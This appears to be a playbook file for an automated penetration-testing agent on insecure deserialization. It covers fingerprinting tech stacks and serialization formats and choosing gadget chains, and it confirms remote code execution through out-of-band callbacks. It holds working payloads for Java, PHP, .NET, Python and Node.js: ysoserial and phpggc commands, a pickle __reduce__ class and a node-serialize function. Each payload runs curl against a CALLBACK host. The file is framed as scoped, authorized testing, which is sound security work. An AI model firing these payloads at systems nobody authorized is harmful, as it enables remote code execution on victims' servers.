---
name: harness-deserialization
description: "Test insecure deserialization in Java, PHP, .NET, Python, Ruby, and Node.js with gadget chain identification, controlled RCE, and OOB confirmation."
---

# Deserialization deep — gadget chains, controlled RCE

Source: `testing-deserialization`, `ysoserial`, `phpggc`, `peas` (2024: Java 17+ bypass via JNDI, PHP phar:// in file ops, .NET TypeNameHandling, Node.js node-serialize, Python pickle).

## Gate

Approved `host+endpoint+injection point` only. Every command via `cyber_process` `argv`. One gadget per attempt. Execution proof = OOB callback only (DNS/HTTP). No destructive payload (no `rm`, no file write to system dirs). → `harness-vuln-triage` before `cyber_finding`.

## Steps

### 1. Technology identification

Before generating any payload, identify the stack:
| Signal | Stack |
|---|---|
| `JSESSIONID` cookie, `.jsp`/`.do` paths | Java |
| `PHPSESSID`, `.php` paths | PHP |
| `ASP.NET_SessionId`, `.aspx` paths | .NET |
| `connect.sid`, Express headers | Node.js |
| `csrftoken` + Django headers | Python |
| `_session_id` + Rails headers | Ruby |

Check for serialized data in:
- Cookies (Base64-encoded objects)
- Hidden form fields
- POST body (binary or Base64)
- Custom headers
- ViewState (.NET)

### 2. Format identification

| Format | Signature |
|---|---|
| Java ObjectInputStream | `aced 0005` (hex) or `rO0AB` (Base64) |
| PHP serialize | `O:4:"User":2:{s:4:"name"` |
| .NET BinaryFormatter | `AAEAAAD/////` (Base64) |
| .NET JSON (Newtonsoft) | `{"$type":"System.` |
| Python pickle | `\x80\x03` or `\x80\x04` or `\x80\x05` |
| Ruby Marshal | `\x04\x08` |
| Node.js | `{"rce":"_$$ND_FUNC$$_function(){...}"}` |
| YAML | `!!python/object/apply:os.system` |

### 3. Gadget chain selection

**Java (ysoserial):**
```bash
java -jar ysoserial.jar CommonsCollections1 "curl https://CALLBACK/java-rce" | base64
```
Common chains: CommonsCollections1-7, CommonsBeanutils1, Spring1-2, Hibernate1, JRMPClient.
Check the target's classpath (error messages, stack traces) to select the right chain.

**PHP (phpggc):**
```bash
phpggc Laravel/RCE1 system "curl https://CALLBACK/php-rce" | base64
```
Common chains: Laravel/RCE1-9, Symfony/RCE1-4, Monolog/RCE1-7, Guzzle/RCE1.
Trigger via `unserialize()`, `phar://` stream wrapper, or `__wakeup`/`__destruct`.

**.NET:**
- BinaryFormatter: `ysoserial.net -f BinaryFormatter -g TypeConfuseDelegate -c "curl CALLBACK"`
- Newtonsoft JSON: `{"$type":"System.Windows.Data.ObjectDataProvider, ...","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, ...","StartInfo":{"FileName":"curl","Arguments":"CALLBACK"}}}`
- ViewState: requires machine key or `__VIEWSTATEGENERATOR`

**Python:**
```python
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ("curl https://CALLBACK/python-rce",))
pickle.dumps(RCE())
```

**Node.js:**
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://CALLBACK/node-rce')}()"}
```

### 4. Delivery and confirmation

1. Inject the serialized payload in the identified injection point
2. Wait for OOB callback at CALLBACK URL
3. If callback received → RCE confirmed
4. If no callback → try different gadget chains (the target may not have the required libraries)

### 5. Blind deserialization (no immediate response)

If the endpoint processes the payload asynchronously:
- Use DNS callback: `nslookup UNIQUE-ID.CALLBACK-DOMAIN`
- Use time-based: gadget that calls `Thread.sleep(5000)` (Java) or `sleep(5)` (PHP)
- 3 consistent time samples required for time-based confirmation

### 6. Negative controls

- Control 1: legitimate serialized object → processed normally (positive control)
- Control 2: malformed serialized data → error, no execution
- Control 3: gadget chain for a library NOT on the classpath → error, no callback
- Control 4: well-formed object with no gadget → no callback

## Proof contract

A finding needs: (1) identified serialization format and stack, (2) working gadget chain with OOB callback, (3) reproduction with fresh correlation ID, (4) four negative controls. A deserialization error is a lead — OOB execution is a finding.

## Done

Each finding cites the format, the gadget chain, the library version, the OOB proof, and all negative controls.
